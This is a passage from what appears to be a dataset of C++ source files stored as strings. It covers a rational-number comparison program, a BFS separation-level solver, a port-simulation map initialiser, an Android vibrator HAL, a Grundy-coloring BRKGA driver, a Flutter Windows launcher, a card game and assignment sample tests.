\";\n\t\t\tr2.print();\n\t\t\tcout << \" = \";\n\t\t\tr3.print();\n\t\t\tbreak;\n\t\tcase GREATER:\n\t\t\tr1.print();\n\t\t\tcout << \" > \";\n\t\t\tr2.print();\n\t\t\tcout << \" ? \";\n\t\t\tif (r1 > r2)\n\t\t\t\tcout << \"yes\\n\";\n\t\t\telse cout << \"no\\n\";\n\t\t\tbreak;\n\t\tcase LESS_THAN:\n\t\t\tr1.print();\n\t\t\tcout << \" < \";\n\t\t\tr2.print();\n\t\t\tcout << \" ? \";\n\t\t\tif (r1 < r2)\n\t\t\t\tcout << \"yes\\n\";\n\t\t\telse cout << \"no\\n\";\n\t\t\tbreak;\n\t\tcase GREATER_OR_EQUAL:\n\t\t\tr1.print();\n\t\t\tcout << \" >= \";\n\t\t\tr2.print();\n\t\t\tcout << \" ? \";\n\t\t\tif (r1 >= r2)\n\t\t\t\tcout << \"yes\\n\";\n\t\t\telse cout << \"no\\n\";\n\t\t\tbreak;\n\t\tcase LESS_OR_EQUAL:\n\t\t\tr1.print();\n\t\t\tcout << \" <= \";\n\t\t\tr2.print();\n\t\t\tcout << \" ? \";\n\t\t\tif (r1 <= r2)\n\t\t\t\tcout << \"yes\\n\";\n\t\t\telse cout << \"no\\n\";\n\t\t\tbreak;\n\t\tcase EQUAL:\n\t\t\tr1.print();\n\t\t\tcout << \" == \";\n\t\t\tr2.print();\n\t\t\tcout << \" ? \";\n\t\t\tif (r1 == r2)\n\t\t\t\tcout << \"yes\\n\";\n\t\t\telse cout << \"no\\n\";\n\t\t\tbreak;\n\t\tcase NOT_EQUAL:\n\t\t\tr1.print();\n\t\t\tcout << \" != \";\n\t\t\tr2.print();\n\t\t\tcout << \" ? \";\n\t\t\tif (r1 != r2)\n\t\t\t\tcout << \"yes\\n\";\n\t\t\telse cout << \"no\\n\";\n\t\t\tbreak;\n\t\t}\n\t\tcout << endl;\n\t\tcout << \" enter your choice : \" << endl;\n\t\tcin >> op;\n\t}\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <queue>\n\nusing namespace std;\n\nvector<int> findSeparationLevels(int N, int M, vector<pair<int, int>>& friendships) {\n    vector<vector<int>> graph(N);\n    for (const auto& friendship : friendships) {\n        int u = friendship.first;\n        int v = friendship.second;\n        graph[u].push_back(v);\n        graph[v].push_back(u);\n    }\n\n    vector<int> levels(N, -1);\n    queue<int> q;\n    q.push(0);\n    levels[0] = 0;\n\n    while (!q.empty()) {\n        int curr_user = q.front();\n        q.pop();\n        for (int neighbor : graph[curr_user]) {\n            if (levels[neighbor] == -1) {\n                levels[neighbor] = levels[curr_user] + 1;\n                q.push(neighbor);\n            }\n        }\n    }\n\n    return levels;\n}\n\nint main() {\n    int N, M;\n    cin >> N >> M;\n\n    vector<pair<int, int>> friendships(M);\n    for (int i = 0; i < M; ++i) {\n        cin >> friendships[i].first >> friendships[i].second;\n    }\n\n    vector<int> separation_levels = findSeparationLevels(N, M, friendships);\n\n    for (int level : separation_levels) {\n        cout << level << \" \";\n    }\n    cout << endl;\n\n    return 0;\n}\n",
    "//\n// Created by \u8bb8\u6668\u6d69 on 2024/4/16.\n//\n\n#include \"MapFunction.h\"\n\nMapFunction::MapFunction(GlobalData &globalData) {\n    m_map = vector<vector<char>>(szOfMap, vector<char>(szOfMap));\n    for (int i = 0; i < szOfMap; ++i) {\n        for (int j = 0; j < szOfMap; ++j) {\n            m_map[i][j] = globalData.plat[i][j];\n        }\n    }\n\n    initDelivery(globalData);\n\n    // \u591a\u7ebf\u7a0b\u521d\u59cb\u5316\u4ea4\u8d27\u70b9\u5757\u6df1\u5ea6\u56fe\n    thread th1(&MapFunction::initDeliveryDepth, this, ref(globalData), 0, m_deliveryBlock.size() / 2);\n    thread th2(&MapFunction::initDeliveryDepth, this, ref(globalData), m_deliveryBlock.size() / 2, m_deliveryBlock.size());\n\n    th1.join();\n    th2.join();\n\n    initBerth(globalData);\n\n    // \u591a\u7ebf\u7a0b\u521d\u59cb\u5316\u6cca\u4f4d\u6df1\u5ea6\u56fe\n    thread th3(&MapFunction::initBerthDepth, this, ref(globalData), 0, m_berthBoatDepth.size() / 2);\n    thread th4(&MapFunction::initBerthDepth, this, ref(globalData), m_berthBoatDepth.size() / 2, m_berthBoatDepth.size());\n\n    th3.join();\n    th4.join();\n\n    initBerthWeight(globalData);\n\n    initRobotCreator(globalData);\n    initBoatCreator();\n\n    initGoodLocalDepth();\n\n    // \u8d27\u7269\u7684\u8d77\u59cb\u4e0b\u6807\u4e3a0\n    goodLeftIndex = 0;\n}\n\nvoid MapFunction::initDelivery(GlobalData &globalData) {\n    int n = m_map.size(), m = m_map[0].size();\n\n    set<pair<int, int>> visitedDelivery;\n\n    int count = 0;\n    for(int i = 0; i < m; i++){\n        for(int j = 0; j < n; j++){\n            if(m_map[i][j] == 'T' && !visitedDelivery.count({i, j})){\n                vector<pair<int, int>> deliveryBlock;\n\n                deliveryBlock.push_back({i, j});\n                visitedDelivery.insert({i, j});\n\n                queue<pair<int, int>> que;\n\n                m_pos2deliveryBlockID[{i, j}] = m_deliveryBlock.size();\n                que.push({i, j});\n\n                while (!que. empty()) {\n                    auto [x, y] = que. front();\n                    que.pop();\n                    for (auto& [dx, dy] : moves) {\n                        int u = x + dx;\n                        int v = y + dy;\n                        if (canMoveOn(u, v) && m_map[u][v] == 'T' && !visitedDelivery.count({u, v})){\n                            m_pos2deliveryBlockID[{u, v}] = m_deliveryBlock.size();\n                            que.push({u, v});\n                            deliveryBlock.push_back({u, v});\n                            visitedDelivery.insert({u, v});\n                        }\n                    }\n                }\n                m_deliveryBlock.push_back(deliveryBlock);\n            }\n        }\n    }\n\n    m_deliveryBlockGlobalDepth.resize(m_deliveryBlock.size());\n}\n\nvoid MapFunction::initDeliveryDepth(GlobalData& globalData, int left, int right){\n\n    int n = m_map.size(), m = m_map[0].size();\n\n    struct Node {\n        int x, y, dir;\n        Node(int _x, int _y, int _dir): x(_x), y(_y), dir(_dir) {\n\n        }\n    };\n\n    for(int i = left; i < right; i++){\n        auto& deliveryBlock = m_deliveryBlock[i];\n        auto& globalDepth = m_deliveryBlockGlobalDepth[i];\n        globalDepth = vector<vector<vector<int>>>(n, vector<vector<int>>(m, vector<int>(4, INF)));\n        queue<Node> que;\n        for(auto& delivery : deliveryBlock){\n            for(int j = 0; j < 4; j++){\n                que.push({delivery.first, delivery.second, j});\n                // \u5f97\u5224\u65ad\u662f\u4e0d\u662f\u5408\u6cd5\u5750\u6807\n                if (checkBoatCanMoveOn(delivery.first, delivery.second, j)) {\n                    globalDepth[delivery.first][delivery.second][j] = 0;\n                }\n            }\n        }\n\n        while (!que.empty()) {\n            auto node = que.front();\n            que.pop();\n            // \u9006\u8fd0\u7b97, \u6a21\u62df\u4e09\u79cd\u64cd\u4f5c\n            int currentDepth = globalDepth[node.x][node.y][node.dir];\n            vector<vector<int>> tmp;\n            // 1. \u5047\u5982\u662f\u524d\u8fdb\u6765\u6b64?\n            tmp.push_back(getInvShip(node.x, node.y, node.dir));\n            // 2. \u5047\u5982\u662f\u987a\u65f6\u9488\u65cb\u8f6c\u6765\u6b64?\n            tmp.push_back(getInvClockwise(node.x, node.y, node.dir));\n            // 3. \u5047\u5982\u662f\u9006\u65f6\u9488\u65cb\u8f6c\u6765\u6b64?\n            tmp.push_back(getInvAnticlockwise(node.x, node.y, node.dir));\n            for (auto& boat : tmp) {\n                if (checkBoatCanMoveOn(boat[0], boat[1], boat[2])) {\n                    int cost = isOnMainChannel(node.x, node.y, node.dir) ? 2 : 1;\n                    if (currentDepth + cost < globalDepth[boat[0]][boat[1]][boat[2]] && currentDepth + cost <= maxBoat2DeliveryDistance) {\n                        que.push(Node(boat[0], boat[1], boat[2]));\n                        globalDepth[boat[0]][boat[1]][boat[2]] = currentDepth + cost;\n                    }\n                }\n            }\n        }\n    }\n}\n\nvoid MapFunction::initBerth(GlobalData& globalData){\n    DECLARE_VARIABLES(frameID, money, berths, robots, boats, goods, goodsLeftPtr, privateRobots, privateBoats, askedRobots, globalData)\n\n    int n = m_map.size(), m = m_map[0].size();\n    int numOfBerths = berths.size();\n\n    // 1. \u8ba1\u7b97\u6cca\u4f4d\u533a\u4e0e\u9760\u6cca\u533a\n    m_pos2Berth.clear();\n    m_pos2NearBerth.clear();\n    for (int berthID = 0; berthID < numOfBerths; ++berthID) {\n        auto& berth = berths[berthID];\n        set<pair<int, int>> vi",
    "/*\n * Copyright (C) 2019 The Android Open Source Project\n * Copyright (C) 2023 StatiXOS\n * SPDX-License-Identifer: Apache-2.0\n */\n\n#include \"vibrator-impl/Vibrator.h\"\n\n#include <android-base/logging.h>\n#include <android-base/properties.h>\n#include <thread>\n#include <map>\n#include <fstream>\n#include <string.h>\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace vibrator {\n\nstd::map<int, std::string> haptic_nodes = {\n    {1, \"/sys/class/leds/vibrator/\"},\n    {2, \"/sys/bus/i2c/drivers/aw8697_haptic/0-005a/\"},\n    {3, \"/sys/bus/i2c/drivers/aw8697_haptic/1-005a/\"},\n    {4, \"/sys/bus/i2c/drivers/aw8697_haptic/2-005a/\"},\n    {5, \"/sys/bus/i2c/drivers/aw8697_haptic/3-005a/\"},\n    {6, \"/sys/bus/i2c/drivers/awinic_haptic/0-005a/\"},\n    {7, \"/sys/bus/i2c/drivers/awinic_haptic/1-005a/\"},\n    {8, \"/sys/bus/i2c/drivers/awinic_haptic/2-005a/\"},\n    {9, \"/sys/bus/i2c/drivers/awinic_haptic/3-005a/\"},\n    {10, \"/sys/bus/i2c/drivers/awinic_haptic/9-005a/\"},\n    {11, \"/sys/bus/i2c/drivers/aw86927_haptic/0-005a/\"},\n    {12, \"/sys/bus/i2c/drivers/aw86927_haptic/1-005a/\"},\n    {13, \"/sys/bus/i2c/drivers/aw86927_haptic/2-005a/\"},\n    {14, \"/sys/bus/i2c/drivers/aw86927_haptic/3-005a/\"},\n};\n\nstatic std::string HAPTIC_NODE;\nstatic std::string HAPTIC_PROP_PREFIX = \"vendor.vibrator.hal.\";\nstatic std::string HAPTIC_PROP_DURATION = \"duration.\";\nstatic std::string HAPTIC_PROP_EFFECT_ID = \"effect_id.\";\nstatic std::string HAPTIC_PROP_INDEX = \"index.\";\nstatic std::string HAPTIC_PROP_MODE=\"mode.\";\n\n// Common haptic nodes\nstatic std::string ACTIVATE_NODE = \"activate\";\nstatic std::string ACTIVATE_MODE_NODE = \"activate_mode\";\nstatic std::string EFFECT_ID_NODE = \"effect_id\";\nstatic std::string INDEX_NODE = \"index\";\nstatic std::string DURATION_NODE = \"duration\";\n\ntemplate <typename T>\nstatic void write_haptic_node(const std::string& path, const T& value) {\n    std::ofstream file(path);\n    file << value;\n}\n\ntemplate <typename T>\nstatic inline int getProperty(std::string key, const T def) {\n    return ::android::base::GetIntProperty(HAPTIC_PROP_PREFIX + key, def);\n}\n\ntemplate <typename T>\nstatic bool openNoCreate(const std::string &file, T *outStream) {\n    auto mode = std::is_base_of_v<std::ostream, T> ? std::ios_base::out : std::ios_base::in;\n    // Force 'in' mode to prevent file creation\n    outStream->open(file, mode | std::ios_base::in);\n    if (!*outStream) {\n        LOG(ERROR) << \"Failed to open %s (%d): %s\" << file.c_str(), errno, strerror(errno);\n        return false;\n    }\n    return true;\n}\n\nndk::ScopedAStatus Vibrator::getCapabilities(int32_t* _aidl_return) {\n    LOG(VERBOSE) << \"Vibrator reporting capabilities\";\n    *_aidl_return = IVibrator::CAP_ON_CALLBACK | IVibrator::CAP_PERFORM_CALLBACK;\n    return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus Vibrator::off() {\n    LOG(VERBOSE) << \"Vibrator off\";\n    /* Reset index before triggering another set of haptics */\n    write_haptic_node(HAPTIC_NODE + INDEX_NODE, 0);\n    /* Reset mode before triggering another set of haptics */\n    write_haptic_node(HAPTIC_NODE + ACTIVATE_MODE_NODE, 1);\n    write_haptic_node(HAPTIC_NODE + ACTIVATE_NODE, 0);\n    return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus Vibrator::on(int32_t timeoutMs,\n                                const std::shared_ptr<IVibratorCallback>& callback) {\n    write_haptic_node(HAPTIC_NODE + DURATION_NODE, timeoutMs);\n    write_haptic_node(HAPTIC_NODE + ACTIVATE_NODE, 1);\n\n    if (callback != nullptr) {\n        // Note that thread lambdas aren't using implicit capture [=], to avoid capturing \"this\",\n        // which may be asynchronously destructed.\n        // If \"this\" is needed, use [sharedThis = this->ref<Vibrator>()].\n        std::thread([timeoutMs, callback] {\n            usleep(timeoutMs * 1000);\n        }).detach();\n    }\n    return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus Vibrator::perform(Effect effect, EffectStrength strength,\n                                     const std::shared_ptr<IVibratorCallback>& callback,\n                                     int32_t* _aidl_return) {\n    ndk::ScopedAStatus status;\n    uint32_t index = 0;\n    uint32_t timeMs = 0;\n    uint32_t activate_mode = 1;\n    uint32_t effect_id = 0;\n    std::ofstream stream;\n\n    for (auto& i: haptic_nodes) {\n        std::string triggerNode = i.second + ACTIVATE_NODE;\n        if (!openNoCreate(triggerNode, &stream))\n            continue;\n        else\n            HAPTIC_NODE = i.second;\n            break;\n    }\n\n    LOG(INFO) << \"Vibrator perform\";\n\n    switch (effect) {\n        case Effect::TICK:\n            LOG(INFO) << \"Vibrator effect set to TICK\";\n            activate_mode = getProperty(HAPTIC_PROP_MODE + \"tick\", 0);\n            effect_id = getProperty(HAPTIC_PROP_EFFECT_ID + \"tick\", 2);\n            index = getProperty(HAPTIC_PROP_INDEX + \"tick\", NULL);\n            timeMs = getProperty(HAPTIC_PROP_DURATION + \"tick\", 30);\n            break;\n        case Effect::TEXTURE_TICK:\n            LOG(INFO) << \"Vibrator effect set to TEXTU",
    "/**\r\n * BRKGA for Grundy coloring problem\r\n * The MIT License (MIT)\r\n *\r\n * Copyright (c) 2023\r\n * Mateus Carvalho da Silva\r\n * Rafael Augusto de Melo\r\n * M\u00e1rcio Costa Santos\r\n * Rodrigo Franco Toso and\r\n * Mauricio G.C. Resende\r\n * \r\n * Permission is hereby granted, free of charge, to any person obtaining a copy of\r\n * this software and associated documentation files (the \"Software\"), to deal in\r\n * the Software without restriction, including without limitation the rights to\r\n * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies\r\n * of the Software, and to permit persons to whom the Software is furnished to do\r\n * so, subject to the following conditions:\r\n *\r\n * The above copyright notice and this permission notice shall be included in all\r\n * copies or substantial portions of the Software.\r\n *\r\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\n * SOFTWARE.\r\n *\r\n */\r\n\r\n/**\r\n * API License\r\n * The MIT License (MIT)\r\n *\r\n * Copyright (c) 2018\r\n * Rodrigo Franco Toso (rfrancotoso@gmail.com) and\r\n * Mauricio G.C. Resende\r\n * \r\n * Permission is hereby granted, free of charge, to any person obtaining a copy of\r\n * this software and associated documentation files (the \"Software\"), to deal in\r\n * the Software without restriction, including without limitation the rights to\r\n * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies\r\n * of the Software, and to permit persons to whom the Software is furnished to do\r\n * so, subject to the following conditions:\r\n *\r\n * The above copyright notice and this permission notice shall be included in all\r\n * copies or substantial portions of the Software.\r\n *\r\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\n * SOFTWARE.\r\n *\r\n */\r\n\r\n#include <iostream>\r\n#include <algorithm>\r\n#include <string.h>\r\n#include <vector>\r\n#include <fstream>\r\n#include <climits>\r\n#include <queue>\r\n#include <cmath>\r\n#include \"brkgaAPI/BRKGA.h\"\r\n#include \"brkgaAPI/MTRand.h\"\r\n\r\n#include \"GrundySolver.h\"\r\n#include \"GrundyDecoder.h\"\r\n#include \"GrundyInstance.h\"\r\n#include \"GrundyVerifier.h\"\r\n\r\nint main(int argc, char* argv[]) {\r\n\tif(argc < 2) { std::cerr << \"usage: <GrundyLIB-file>\" << std::endl; return -1; }\r\n\r\n\t//std::cout << \"Welcome to the BRKGA API sample driver.\\nFinding a (heuristic) minimizer for \"\r\n\t//\t\t<< \" the Grundy Number.\" << std::endl;\r\n\r\n\tstd::string instanceFileName = \"\";\r\n\tstd::string solverType = \"grundyNP\";\r\n\tstd::string outputFile = \"outputTest.sol\";\r\n\tstd::string outputFileExec = \"outputTestExec.sol\";\r\n\tdouble timeLimit = 300;\r\n\tdouble readPe = 0.15;\r\n\tdouble readPm = 0.1;\r\n\tdouble readRhoe = 0.7;\r\n\tint numThreads = 1;\r\n\tint numGenerations = INT_MAX;\r\n\tint numPopulations = 1;\r\n\tint populationFactor = 0;\r\n\tint seed = 100;\r\n\tint hasIG = 0; \r\n\r\n\tfor(int i=0; i<argc; i++){\r\n\t\tif(strcmp(argv[i],\"--time\") == 0){\r\n\t\t\ttimeLimit = atof(argv[i+1]);\r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--inst\") == 0){\r\n\t\t\tinstanceFileName = std::string(argv[i+1]);\r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--pe\") == 0){\r\n\t\t\treadPe = atof(argv[i+1]);\r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--pm\") == 0){\r\n\t\t\treadPm = atof(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--rhoe\") == 0){\r\n\t\t\treadRhoe = atof(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--solver\") == 0){\r\n\t\t\tsolverType = std::string(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--output\") == 0){\r\n\t\t\toutputFile = std::string(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--outputExec\") == 0){\r\n\t\t\toutputFileExec = std::string(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--generation\") == 0){\r\n\t\t\tnumGenerations = atoi(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--thread\") == 0){\r\n\t\t\tnumThreads = atoi(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--population\") == 0){\r\n\t\t\tnumPopulations = atoi(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--factor\") == 0){\r\n\t\t\tpopulationFactor = atoi(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--seed\") == 0){\r\n\t\t\tseed = atoi(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}else if(strcmp(argv[i],\"--ig\") == 0){\r\n\t\t\thasIG = atoi(argv[i+1]); \r\n\t\t\ti++;\r\n\t\t}\r\n\r\n\t}\t\t\r\n\r\n\tconst clock_t begin = clock();\r\n\r\n\tconst std::string instanceFile = inst",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"yes_or_no\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n#include <iomanip>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct kart{\r\n    string type;\r\n    int point;\r\n};\r\n\r\nstruct player{\r\n    string name;\r\n    int point = 0;\r\n    vector<kart> kart_mojod;\r\n    vector<kart> kart_nemayesh_mordegan;\r\n};\r\n\r\n\r\nvector<kart> karts;\r\n\r\nint max_point;\r\nint player_number;\r\n\r\nvoid control_unit(player *);\r\nvoid meghdardehi_player(vector<kart> *);\r\nvoid play_game(player *);\r\nvoid what_max_point();\r\nvoid signin_player(player *);\r\nvoid start();\r\nvoid amaliat(player * , int  , bool &);\r\nvoid show_kartsgame(player * , int  , bool & );\r\nbool shart_emtiaz(player );\r\nvoid shomaresh_emtiaz(player *);\r\nbool shart_edame(player *);\r\nvoid tozie_kart(player *);\r\nint win_player_f(player *);\r\nvoid show_table(player *);\r\nvoid sort_players(player *);\r\nvoid end_game(player *);\r\nvoid show_curentkarts(vector<kart> );\r\n\r\nvoid meghdardehi_kartha(){\r\n    srand(time(0));\r\n    kart kohnepich[30];\r\n    kart kalekado[30];\r\n    kart gorbegor[30];\r\n\r\n    for(int i=0 ; i<30 ; i++){\r\n        \r\n        kohnepich[i].type = \"kohne pich\";\r\n        kohnepich[i].point = (rand() % 15) + 1;\r\n        kalekado[i].type = \"kale kadoo\";\r\n        kalekado[i].point = (rand() % 15) + 1;\r\n        gorbegor[i].type = \"gor be gor\";\r\n        gorbegor[i].point = (rand() % 15) + 1;\r\n    }\r\n\r\n    for(int i=0 ; i<30 ; i++)\r\n    {\r\n        karts.push_back(kohnepich[i]);\r\n        karts.push_back(kalekado[i]);\r\n        karts.push_back(gorbegor[i]);\r\n    }\r\n}\r\n\r\nint main()\r\n{   \r\n    system(\"cls\");\r\n    cout << \"\\n\\n\\n\\n be bazi kastel khoshomadid.\\n\";\r\n    cout << \"\\n\\n\\n\\t main menu\\n\";\r\n    cout << \"\\n 1-shoroe bazi jadid\\n 2-exit\\n\\nentekhab: \";\r\n    int ch;\r\n    cin >> ch;\r\n\r\n    switch (ch)\r\n    {\r\n    case 1: start();break;\r\n    case 2: return 0; break;\r\n    default:\r\n        cout << \"entekhab eshtebah ast.\";\r\n        getch();\r\n        main();\r\n    }\r\n}\r\n\r\nvoid what_max_point()\r\n{\r\n    cout << \"hadaxar emtiaz bazi chand bashad? \";\r\n    cin >> max_point;\r\n}\r\n\r\nvoid signin_player(player *p)\r\n{\r\n\r\n    for(int i=0 ; i<player_number ; i++){\r\n        cout << \"name bazikon shomare \" << i+1 << \" ra vared konid: \";\r\n        cin >> p[i].name ;\r\n    }\r\n}\r\n\r\nvoid meghdardehi_player(vector<kart> *k){\r\n    srand(time(0));\r\n    int count = (rand() % (karts.size()-1));\r\n    while(k->size() < 3){\r\n        k->push_back(karts[count]);\r\n        karts.erase(karts.begin()+count);\r\n    }\r\n}\r\n\r\nvoid amaliat(player *p , int i , bool &b)\r\n{\r\n    cout << \"shomare kart mored nazar az dast khod ra entekhab konid: \";\r\n    int choosen;\r\n    cin >> choosen;\r\n\r\n    cout << \"shomare daste kart mored nazar barai entaghal kart entekhab shode ra entekhab konid: \";\r\n    int row_choosen;\r\n    cin >> row_choosen;\r\n\r\n    cout << \"shomare kart mored nazar dar dastekart entekhab shode barai entaghal kart ra entekhab konid: \";\r\n    int kart_gharargiri;\r\n    cin >> kart_gharargiri;\r\n\r\n    if(!(choosen >= 1 && choosen <= 3) || !(row_choosen >= 1 && row_choosen <= player_number) || !(kart_gharargiri >= 1 && kart_gharargiri <= 6))\r\n    {\r\n        cout << \"adad vorodi eshtebah ast.\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan.size() < kart_gharargiri){\r\n        p[row_choosen-1].kart_nemayesh_mordegan.push_back(p[i].kart_mojod[choosen-1]);\r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1].type == p[i].kart_mojod[choosen-1].type){\r\n        \r\n        bool u = 1;\r\n        for(auto &j : p[row_choosen-1].kart_nemayesh_mordegan){\r\n            \r\n            if(j.type == p[i].kart_mojod[choosen-1].type && j.point == p[i].kart_mojod[choosen-1].point){\r\n                j = p[i].kart_mojod[choosen-1];\r\n                u = 0;\r\n            }\r\n        }\r\n        if(u)\r\n            p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1] =  p[i].kart_mojod[choosen-1];\r\n        \r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    \r\n    else{\r\n        cout << \"kart ha ba ham, ham type nistand. bayad kart hai entekhab shode ham type va ham noe bashand.\\n\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    \r\n    if(p[row_choosen-1].kart_nemayesh_mordegan.size() == 6 || p[i].kart_mojod.size() == 0) b = 1;\r\n}\r\n\r\nvoid show_curentkarts(vector<kart> curentkart){\r\n    cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n    for(int k=0 ; k<3 ; k++){\r\n        cout << setfill('-') << setw(16) << \"  \";\r\n    }\r\n    cout << setfill(' ') << setw(29) <<'+' << endl;\r\n    for(int l=0 ; l<7 ; l++){\r\n        if(l == 2){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n            for(int k=0 ; k<curentkart.size() ; k++){\r\n                cout << \"| \" << curentkart[k].type << \" |  \";\r\n            }\r\n            \r\n            cout << setfill(' ') << setw(29) <<'+' << endl;\r\n        }\r\n        else if(l == 4){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n",
    "/*\n* Ho Chi Minh City University of Technology\n* Faculty of Computer Science and Engineering\n* Initial code for Assignment 1\n* Programming Fundamentals Spring 2023\n* Author: Vu Van Tien\n* Date: 01.03.2023\n*/\n\n//The library here is concretely set, students are not allowed to include any other libraries.\n\n#include \"study_in_pink2.h\"\n\nusing namespace std;\n\nvoid g_satc_02() { // global\n    cout << \"----- Sample Testcase 02 -----\" << endl;\n    Configuration * config = new Configuration(\"sa_tc_02_config\");\n    cout << config->str() << endl;\n    delete config;\n}\n\nclass TestStudyInPink {\npublic:\n    TestStudyInPink() = default;\n\n    static void satc_01() {\n        cout << \"----- Sample Testcase 01 -----\" << endl;\n        int num_walls = 3;\n        Position arr_walls[] = {Position(1, 2), Position(2, 3), Position(3, 4)};\n        int num_fake_walls = 1;\n        Position arr_fake_walls[] = {Position(2, 0)};\n\n        Map * map = new Map(10, 10, num_walls, arr_walls, num_fake_walls, arr_fake_walls);\n        \n        Sherlock * sherlock = new Sherlock(1, \"RUU\", Position(1, 3), map, 250, 450);\n        cout << sherlock->str() << endl;\n\n        Watson * watson = new Watson(2, \"LU\", Position(2, 1), map, 300, 350);\n        cout << watson->str() << endl;\n\n        Criminal * criminal = new Criminal(0, Position(7, 9), map, sherlock, watson);\n        cout << criminal->str() << endl;\n\n        cout << \"* Sherlock makes a move\" << endl;\n        sherlock->move();\n        cout << sherlock->str() << endl;\n\n        cout << \"* Watson makes a move\" << endl;\n        watson->move();\n        cout << watson->str() << endl;\n\n        cout << \"* Criminal makes a move\" << endl;\n        criminal->move();\n        cout << criminal->str() << endl;\n\n        ArrayMovingObject * arr_mv_objs = new ArrayMovingObject(10);\n        arr_mv_objs->add(criminal);\n        arr_mv_objs->add(sherlock);\n        arr_mv_objs->add(watson);\n        cout << arr_mv_objs->str() << endl;\n        \n        delete arr_mv_objs;\n        delete sherlock;\n        delete watson;\n        delete criminal;\n        delete map;\n    }\n\n    static void satc_02() {\n        g_satc_02();\n    }\n\n    static void satc_03() {\n        // Sample test for RobotC\n        cout << \"----- Sample Testcase 03 -----\" << endl;\n        int num_walls = 3;\n        Position arr_walls[] = {Position(1, 2), Position(2, 3), Position(3, 4)};\n        int num_fake_walls = 1;\n        Position arr_fake_walls[] = {Position(2, 0)};\n\n        Map * map = new Map(10, 10, num_walls, arr_walls, num_fake_walls, arr_fake_walls);\n\n        Sherlock * sherlock = new Sherlock(1, \"RUU\", Position(1, 3), map, 250, 450);\n        Watson * watson = new Watson(2, \"LU\", Position(2, 1), map, 300, 